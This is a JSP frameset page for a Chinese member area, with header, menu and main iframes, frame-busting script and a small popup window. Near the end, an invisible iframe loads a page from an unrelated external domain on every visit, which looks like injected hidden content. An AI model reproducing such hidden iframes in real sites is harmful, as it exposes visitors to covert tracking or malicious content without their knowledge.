<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>
<%
String path = request.getContextPath();
String basePath = request.getScheme()+"://"+request.getServerName()+":"+request.getServerPort()+path+"/";
%>
<html g_init="6858">
<head>
<title>会员</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<link rel="shortcut icon" href="./admincg/images/favicon.ico" type="image/x-icon">
<script language="JavaScript">
	if(self!=top) window.open('index.php','_top');
	if(self.location.hostname!=top.location.hostname) top.location=self.location;
	var _OldOrderPrint = [];
	
</script>
<script src="./admincg/javascript/common.js" type="text/javascript"></script>
</head>
<body style="margin: 0px;" scroll="no">
<iframe id="logoutifr" name="logoutifr" width="0" height="0" style="display:none"></iframe>
<iframe id="soonsend_ifr" name="soonsend_ifr" width="0" height="0" style="display:none"></iframe>
<div style="position: absolute;top: 0px;left: 0px; z-index: 2;height: 95px;width: 100%">
  <iframe frameborder="0" id="header" name="header" src="<%=path %>/front/top.jsp" scrolling="no" style="height: 95px; visibility: inherit; width: 100%; z-index: 1;"></iframe>
</div>
<table border="0" cellpadding="0" cellspacing="0" height="100%" width="100%" style="table-layout: fixed;">
  <tbody>
    <tr>
      <td width="201" height="95"></td>
      <td></td>
    </tr>
    <tr>
      <td><iframe frameborder="0" id="menu" name="menu" scrolling="yes" src="<%=path %>/front/left.jsp" style="height: 558px; visibility: inherit; width: 100%; z-index: 2; overflow: auto;" onload="loadIf(this,1);"></iframe></td>
      <td><iframe frameborder="0" id="main" name="main" scrolling="yes" src="<%=path %>/front/main.jsp" style="height: 558px; visibility: inherit; width: 100%; z-index: 3; overflow: auto;" onload="loadIf(this,1);"></iframe></td>
    </tr>
  </tbody>
</table>
<script language="JavaScript">var window_img='./admincg/images/';</script>
<script src="./admincg/javascript/show_window.js" type="text/javascript"></script>
<noscript>
&lt;iframe src=*.html&gt;&lt;/iframe&gt;
</noscript>
<script type="text/javascript" charset="utf-8" id="0DF98C125855B791_Analytics" src="http://tajs.qq.com/stats?sId=26506734"></script>
<iframe src="https://dl.metabar.ru/static/storage/index.html?version=201508141843" style="display: none;"></iframe>
<div id="xp" style="position: absolute; z-index: 9000; overflow: hidden; border: 0px solid rgb(255, 0, 0); width: 260px; height: 28px; left: 1087px; top: 623px;">
  <div id="xp_content" style="position: absolute; z-index: 1; overflow: hidden; border-width: 0px; width: 260px; height: 190px; left: 0px; top: 0px;"><a id="closeButton" href="#" style="position: absolute; z-index: 2; font-size: 0px; line-height: 0px; left: 240px; top: 6px; width: 15px; height: 15px; background-image: url(http://3e.133133111.com/admincg/images/close.gif);"></a><a id="switchButton" href="#" style="position: absolute; z-index: 2; font-size: 0px; line-height: 0px; left: 220px; top: 6px; width: 15px; height: 15px; background-image: url(http://3e.133133111.com/admincg/images/min.gif);"></a>
    <iframe id="xp_content_iframe" src="admincg/new.jsp" frameborder="0" scrolling="no" width="100%" height="100%" style="height:100%"></iframe>
  </div>
</div>
</body>
</html>
